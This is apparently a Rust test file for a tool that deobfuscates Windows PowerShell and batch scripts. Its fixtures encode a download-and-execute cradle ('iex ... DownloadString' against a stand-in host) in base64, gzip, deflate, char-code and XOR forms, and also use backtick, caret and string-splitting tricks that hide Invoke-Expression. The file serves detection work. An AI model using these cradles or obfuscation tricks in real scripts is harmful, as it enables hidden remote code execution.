#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
use disrobe_pass_scriptlang::lang::winscript;
use disrobe_pass_scriptlang::lang::winscript::recover;
use disrobe_pass_scriptlang::{WinScriptLang, WinScriptRecovery, WinTechnique, analyze, classify};

const REAL_IEX: &str = "iex (New-Object Net.WebClient).DownloadString('http://x/y')";

fn rec(text: &str) -> WinScriptRecovery {
    let lang: WinScriptLang =
        winscript::classify(text).expect("should classify as a windows script");
    recover(lang, text)
}

#[test]
fn real_encoded_command_utf16le_base64() {
    let enc: &str = "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AeAAvAHkAJwApAA==";
    let cmd: String = format!("powershell.exe -EncodedCommand {enc}");
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::EncodedCommand));
    assert_eq!(r.recovered_text, REAL_IEX);
}

#[test]
fn real_gzip_base64_iex_inflate() {
    let b64: &str = "H4sIAAAAAAAEAMtMrVDQ8Est1/VPykpNLlHwSy3RC09Ncs7JTM0r0dRzyS/Py8lPTAkuKcrMS9dQzygpKbDS16/Qr1TXBACoP1JWOwAAAA==";
    let cmd: String = format!(
        "$d=[Convert]::FromBase64String('{b64}'); $g=New-Object IO.Compression.GzipStream; iex $d"
    );
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::GzipInflate));
    assert_eq!(r.recovered_text, REAL_IEX);
}

#[test]
fn real_deflate_base64_iex_inflate() {
    let b64: &str =
        "y0ytUNDwSy3X9U/KSk0uUfBLLdELT01yzslMzSvR1HPJL8/LyU9MCS4pysxL11DPKCkpsNLXr9CvVNcEAA==";
    let cmd: String = format!(
        "$d=[Convert]::FromBase64String('{b64}'); $s=New-Object IO.Compression.DeflateStream; iex $d"
    );
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::DeflateInflate));
    assert_eq!(r.recovered_text, REAL_IEX);
}

#[test]
fn real_char_code_join_rebuild() {
    let codes: &str = "105,101,120,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,120,47,121,39,41";
    let cmd: String = format!("iex (([char[]]({codes})) -join '')");
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::CharCodeJoin));
    assert!(
        r.recovered_text.contains(REAL_IEX),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_xor_base64_literal_key() {
    let b64: &str = "fVhDXk8HYkVZXgpZT0lYT14=";
    let cmd: String = format!(
        "$b=[Convert]::FromBase64String('{b64}'); $b | ForEach-Object {{ $_ -bxor 42 }}; iex"
    );
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::XorWrapper));
    assert_eq!(r.recovered_text, "Write-Host secret");
}

#[test]
fn xor_runtime_key_is_walled_not_faked() {
    let b64: &str = "fVhDXk8HYkVZXgpZT0lYT14=";
    let cmd: String = format!(
        "$k=Get-Content key.bin; $b=[Convert]::FromBase64String('{b64}'); $b | %{{ $_ -bxor $k }}; iex"
    );
    let r: WinScriptRecovery = rec(&cmd);
    assert!(
        r.walls
            .iter()
            .any(|w| w.technique == WinTechnique::XorWrapper),
        "runtime-only xor key must wall, not fake recovery: {r:?}"
    );
    assert_ne!(r.recovered_text, "Write-Host secret");
}

#[test]
fn real_backtick_escape_strip() {
    let cmd: &str = "I`E`X (New-Object Net.WebClient)";
    let r: WinScriptRecovery = rec(cmd);
    assert!(r.techniques.contains(&WinTechnique::BacktickEscape));
    assert!(r.recovered_text.starts_with("IEX"));
}

#[test]
fn real_caret_escape_strip_batch() {
    let cmd: &str = "@echo off\np^o^w^e^r^s^h^e^l^l -enc AAAA";
    let lang: WinScriptLang = winscript::classify(cmd).expect("batch");
    assert_eq!(lang, WinScriptLang::Batch);
    let r: WinScriptRecovery = recover(lang, cmd);
    assert!(r.techniques.contains(&WinTechnique::CaretEscape));
    assert!(r.recovered_text.contains("powershell"));
}

#[test]
fn real_string_concat_reassembly() {
    let cmd: &str = "$x = 'Inv'+'oke-Expr'+'ession'; & $x";
    let r: WinScriptRecovery = rec(cmd);
    assert!(r.techniques.contains(&WinTechnique::StringConcat));
    assert!(
        r.recovered_text.contains("'Invoke-Expression'"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_format_operator_reassembly() {
    let cmd: &str = "$x = ('{0}{1}{2}' -f 'Inv','oke-Expr','ession'); & $x";
    let r: WinScriptRecovery = rec(cmd);
    assert!(r.techniques.contains(&WinTechnique::FormatOperator));
    assert!(
        r.recovered_text.contains("'Invoke-Expression'"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_securestring_plaintext_recovered() {
    let cmd: &str = "$p = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force; New-Object Management.Automation.PSCredential('u',$p)";
    let r: WinScriptRecovery = rec(cmd);
    assert!(r.techniques.contains(&WinTechnique::SecureStringPlaintext));
    assert!(
        r.recovered_text.contains("P@ssw0rd!"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn securestring_runtime_key_walled() {
    let cmd: &str = "$k = Get-Content key.bin; $s = ConvertTo-SecureString $enc -Key $k; $s";
    let r: WinScriptRecovery = rec(cmd);
    assert!(
        r.walls
            .iter()
            .any(|w| w.technique == WinTechnique::SecureStringPlaintext),
        "runtime-key securestring must wall: {r:?}"
    );
}

#[test]
fn clean_control_yields_nothing() {
    let clean: &str = "Get-ChildItem -Path C:\\Windows | Where-Object { $_.Length -gt 1000 }";
    let r: WinScriptRecovery = rec(clean);
    assert!(
        !r.is_obfuscated(),
        "clean script must not report obfuscation: {:?}",
        r.techniques
    );
    assert!(r.walls.is_empty());
}

#[test]
fn non_script_rejected() {
    let bytes: &[u8] = &[0x00u8, 0x01, 0x02, 0x03, 0xff, 0xfe, 0x42, 0x99];
    assert!(analyze(bytes).is_err());
}

#[test]
fn classify_via_top_level_perl_still_works() {
    let perl: &[u8] = b"// Generated by Haxe 4.3.6\n();\n";
    assert!(classify(perl).is_some());
}

#[test]
fn layered_encoded_then_inner_concat() {
    let inner: &str = "$x='Inv'+'oke'; & $x";
    let enc: String = {
        let utf16: Vec<u8> = inner.encode_utf16().flat_map(u16::to_le_bytes).collect();
        base64(&utf16)
    };
    let cmd: String = format!("powershell -enc {enc}");
    let r: WinScriptRecovery = rec(&cmd);
    assert!(r.techniques.contains(&WinTechnique::EncodedCommand));
    assert!(r.techniques.contains(&WinTechnique::StringConcat));
    assert!(
        r.recovered_text.contains("'Invoke'"),
        "recovered: {}",
        r.recovered_text
    );
}

fn base64(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out: String = String::new();
    for chunk in data.chunks(3) {
        let b: [u8; 3] = [
            chunk[0],
            chunk.get(1).copied().map_or(0u8, |value: u8| value),
            chunk.get(2).copied().map_or(0u8, |value: u8| value),
        ];
        let n: u32 = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
        out.push(T[(n >> 18 & 63) as usize] as char);
        out.push(T[(n >> 12 & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            T[(n >> 6 & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            T[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}
